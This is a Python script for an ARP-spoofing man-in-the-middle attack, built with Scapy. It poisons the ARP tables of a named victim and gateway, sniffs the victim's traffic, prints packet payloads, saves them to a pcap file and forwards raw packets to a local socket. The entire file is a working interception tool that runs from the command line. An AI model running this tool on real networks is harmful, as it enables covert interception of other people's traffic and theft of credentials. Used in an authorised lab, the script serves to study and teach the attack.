import sys
import time
import socket
from multiprocessing import Process
from scapy.all import ARP, Ether, IP, conf, get_if_hwaddr, send, sniff, srp, wrpcap

def get_mac(target_ip, target_name):
    print(f'\n[*] Tracking {target_name.capitalize()} MAC Address...\n')
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op='who-has', pdst=target_ip)
    print(f"Sending ARP request: {packet.summary()}")
    
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        print(f"\nCaptured {target_name.capitalize()} MAC address successfully!")
        return r[Ether].src
    return None

class Arper:
    def __init__(self, victim, gateway, interface="wlan0"):
        self.victim = victim
        self.gateway = gateway
        self.interface = interface

        # Get the MAC addresses of the victim and gateway
        self.gateway_mac = get_mac(gateway, "gateway")
        self.victim_mac = get_mac(victim, "victim")
        
        if not self.gateway_mac or not self.victim_mac:
            print("Failed to get MAC addresses. Exiting...")
            sys.exit(1)

        conf.iface = interface
        conf.verb = 0  # Disable verbose output for Scapy
        
        print("-" * 40)
        print(f"Initialized Interface: [{interface}]")
        print(f"Gateway: {gateway} is at {self.gateway_mac}")
        print(f"Victim: {victim} is at {self.victim_mac}")
        print("-" * 40)

    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.sniff_thread = Process(target=self.sniff, args=(200,))

        self.poison_thread.start()
        self.sniff_thread.start()

        self.poison_thread.join()
        self.sniff_thread.join()

    def poison(self):
        poison_victim = ARP(op=2, psrc=self.gateway, pdst=self.victim, hwdst=self.victim_mac)
        poison_gateway = ARP(op=2, psrc=self.victim, pdst=self.gateway, hwdst=self.gateway_mac)

        print("-" * 40)
        print("Poisoning Victim and Gateway ARP tables...")
        print("-" * 40)

        try:
            while True:
                sys.stdout.write("#")
                sys.stdout.flush()
                send(poison_victim, verbose=False)
                send(poison_gateway, verbose=False)
                time.sleep(2)
        except KeyboardInterrupt:
            print("\n[!] Detected interruption. Restoring ARP tables and exiting...")
            self.restore()
            sys.exit(0)
        except Exception as e:
            print(f"[-] Error during poisoning: {e}")
            self.restore()
            sys.exit(1)

    def sniff(self, count=200):
        time.sleep(2)  # Give some time for ARP poisoning to take effect
        print(f'Sniffing {count} packets...')
        
        bpf_filter = f'ip host {self.victim}'
        try:
            sniff(count=count, filter=bpf_filter, iface=self.interface, prn=self.process_packet)
            print("Sniffing complete, packets saved to arper.pcap")
        except Exception as e:
            print(f"[-] Error during sniffing: {e}")
        finally:
            self.restore()

    def process_packet(self, packet):
        try:
            if packet.haslayer(IP):
                ip_layer = packet[IP]
                src_ip = ip_layer.src
                dst_ip = ip_layer.dst
            else:
                src_ip = "N/A"
                dst_ip = "N/A"

            if packet.haslayer(Ether):
                eth_layer = packet[Ether]
                src_mac = eth_layer.src
                dst_mac = eth_layer.dst
            else:
                src_mac = "N/A"
                dst_mac = "N/A"

            # Get the payload and convert it to a readable format
            payload = bytes(packet.payload)
            try:
                payload_str = payload.decode(errors='replace')
            except UnicodeDecodeError:
                payload_str = "Non-printable or binary data"

            print(f"\n[+] Captured packet:")
            print(f"    Source IP: {src_ip}")
            print(f"    Destination IP: {dst_ip}")
            print(f"    Source MAC: {src_mac}")
            print(f"    Destination MAC: {dst_mac}")
            print(f"    Payload: {payload_str}")

            self.send_to_proxy(packet)
            wrpcap('arper.pcap', packet, append=True)
        except Exception as e:
            print(f"[-] Error processing packet: {e}")

    def send_to_proxy(self, packet):
        proxy_ip = '127.0.0.1'
        proxy_port = 9999

        try:
            packet_data = bytes(packet)
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proxy_socket:
                proxy_socket.connect((proxy_ip, proxy_port))
                print("[+] Packet sending to proxy server.")
                proxy_socket.send(packet_data)
                print("[+] Packet sent to proxy server.")
        except Exception as e:
            print(f"[-] Error sending the packet to proxy: {e}")

    def restore(self):
        print("Restoring ARP tables...")
        try:
            send(ARP(op=2, psrc=self.gateway, hwsrc=self.gateway_mac, pdst=self.victim, hwdst='ff:ff:ff:ff:ff:ff', count=5), verbose=False)
            send(ARP(op=2, psrc=self.victim, hwsrc=self.victim_mac, pdst=self.gateway, hwdst='ff:ff:ff:ff:ff:ff', count=5), verbose=False)
            print("ARP tables restored.")
        except Exception as e:
            print(f"[-] Error restoring ARP tables: {e}")

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print("Usage: python script.py <victim_ip> <gateway_ip> <interface>")
        sys.exit(1)

    victim, gateway, interface = sys.argv[1], sys.argv[2], sys.argv[3]
    myarp = Arper(victim, gateway, interface)
    myarp.run()
